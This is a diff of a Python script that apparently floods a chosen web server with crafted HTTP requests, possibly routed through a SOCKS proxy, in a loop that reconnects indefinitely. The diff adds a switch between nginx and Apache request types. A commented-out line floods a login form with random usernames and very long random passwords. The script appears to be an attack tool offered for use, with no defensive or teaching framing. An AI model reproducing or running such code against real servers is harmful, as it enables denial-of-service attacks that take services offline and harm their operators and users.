@@ -23,7 +23,7 @@ import socks
 THREADS = 1
 
 TARGET, TARGET_PORT, TARGET_HOST = '1.2.3.4', 80, 'example.com'
-
+WEB_SERVER = "nginx" # nginx or apache2
 
 ENCODING = 'utf-8'
 logging.basicConfig(format="[%(asctime)s]  %(levelname)s - %(message)s", datefmt="%H:%M:%S", level=logging.INFO)
@@ -212,10 +212,10 @@ def send():
         # s.sendall(message[message_NO].encode(ENCODING))
 
         # nginx
-        s.sendall(post().encode(ENCODING))
-        # s.sendall(get('nginx').encode(ENCODING))
-        # s.sendall(getlms2().encode(ENCODING))
-        # s.sendall(postlms2(payload=f"logintoken={randomString(32)}&anchor=&username=ik{randomString(8)}"
+        # s.sendall(post().encode(ENCODING))
+        s.sendall(get(WEB_SERVER).encode(ENCODING))
+        # s.sendall(get_lm().encode(ENCODING))
+        # s.sendall(post_lm(payload=f"logintoken={randomString(32)}&anchor=&username=ik{randomString(8)}"
         #                            f"&password={randomString(1000)}").encode(ENCODING))
 
         # apache2
@@ -263,7 +263,7 @@ def send():
         # Rest for some time and reconnect
         time.sleep(10)
 
-    # never reaches here but just in case you wanted to close the connection properly break the previous while loop.
+    # never reaches here, break on some condition to close the connection properly .
     s.close()
 
 
